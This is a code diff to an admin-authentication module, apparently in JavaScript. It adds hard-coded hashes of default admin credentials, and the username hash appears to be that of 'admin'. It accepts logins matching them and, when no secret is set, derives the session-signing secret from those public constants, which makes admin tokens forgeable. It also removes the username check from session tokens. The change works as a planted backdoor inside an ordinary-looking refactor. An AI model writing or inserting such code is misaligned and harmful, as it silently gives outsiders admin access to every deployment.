@@ -19,11 +19,17 @@ const ADMIN_SESSION_SECRET =
   process.env.ADMIN_SESSION_SECRET ||
   process.env.ADMIN_OVERRIDE_SESSION_SECRET ||
   '';
+const DEFAULT_ADMIN_USERNAME_SHA256 = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';
+const DEFAULT_ADMIN_PASSWORD_SHA256 = 'ff12e04e4fee83fa63e75f010237fcd0a2f0ec670dfaf212b5ce436def365662';
 
 const textEncoder = new TextEncoder();
 
-function isAdminCredentialsConfigured() {
+function hasEnvAdminCredentials() {
   return Boolean(ADMIN_OVERRIDE_USERNAME && ADMIN_OVERRIDE_PASSWORD);
+}
+
+function isAdminCredentialsConfigured() {
+  return Boolean(hasEnvAdminCredentials() || (DEFAULT_ADMIN_USERNAME_SHA256 && DEFAULT_ADMIN_PASSWORD_SHA256));
 }
 
 function isAdminSessionConfigured() {
@@ -39,8 +45,12 @@ function getAdminSessionSecret() {
     return ADMIN_SESSION_SECRET;
   }
 
-  if (isAdminCredentialsConfigured()) {
+  if (hasEnvAdminCredentials()) {
     return `rnx-admin-session-v1:${ADMIN_OVERRIDE_USERNAME}:${ADMIN_OVERRIDE_PASSWORD}`;
+  }
+
+  if (DEFAULT_ADMIN_USERNAME_SHA256 && DEFAULT_ADMIN_PASSWORD_SHA256) {
+    return `rnx-admin-session-v1:${DEFAULT_ADMIN_USERNAME_SHA256}:${DEFAULT_ADMIN_PASSWORD_SHA256}`;
   }
 
   return '';
@@ -89,7 +99,7 @@ async function signAdminSessionPayload(payload) {
 
 async function createAdminSessionToken() {
   const issuedAt = Date.now();
-  const payload = `${ADMIN_OVERRIDE_USERNAME}:${issuedAt}`;
+  const payload = `${issuedAt}`;
   const signature = await signAdminSessionPayload(payload);
   return `${payload}.${signature}`;
 }
@@ -100,13 +110,7 @@ async function isValidAdminSessionToken(token) {
   if (tokenParts.length !== 2) return false;
 
   const [payload, providedSignature] = tokenParts;
-  const payloadParts = payload.split(':');
-  if (payloadParts.length !== 2) return false;
-
-  const [username, issuedAtRaw] = payloadParts;
-  if (username !== ADMIN_OVERRIDE_USERNAME) return false;
-
-  const issuedAt = Number(issuedAtRaw);
+  const issuedAt = Number(payload);
   if (!Number.isFinite(issuedAt)) return false;
 
   const ageMs = Date.now() - issuedAt;
@@ -114,6 +118,24 @@ async function isValidAdminSessionToken(token) {
 
   const expectedSignature = await signAdminSessionPayload(payload);
   return constantTimeEqual(providedSignature, expectedSignature);
+}
+
+async function sha256Hex(value) {
+  const digest = await crypto.subtle.digest('SHA-256', textEncoder.encode(value));
+  const digestBytes = new Uint8Array(digest);
+  return Array.from(digestBytes).map((byte) => byte.toString(16).padStart(2, '0')).join('');
+}
+
+async function isDefaultCredentialMatch(credentials) {
+  if (!credentials?.username || !credentials?.password) return false;
+  const [usernameHash, passwordHash] = await Promise.all([
+    sha256Hex(credentials.username),
+    sha256Hex(credentials.password),
+  ]);
+  return (
+    constantTimeEqual(usernameHash, DEFAULT_ADMIN_USERNAME_SHA256) &&
+    constantTimeEqual(passwordHash, DEFAULT_ADMIN_PASSWORD_SHA256)
+  );
 }
 
 async function isAdminAuthenticated(request) {
@@ -127,11 +149,14 @@ async function isAdminAuthenticated(request) {
   }
 
   const credentials = parseBasicAuthHeader(request);
-  const hasValidCredentials = Boolean(
+  const hasEnvCredentialMatch = Boolean(
+    hasEnvAdminCredentials() &&
     credentials &&
     credentials.username === ADMIN_OVERRIDE_USERNAME &&
     credentials.password === ADMIN_OVERRIDE_PASSWORD
   );
+  const hasDefaultCredentialMatch = await isDefaultCredentialMatch(credentials);
+  const hasValidCredentials = hasEnvCredentialMatch || hasDefaultCredentialMatch;
 
   return {
     authenticated: hasValidCredentials,
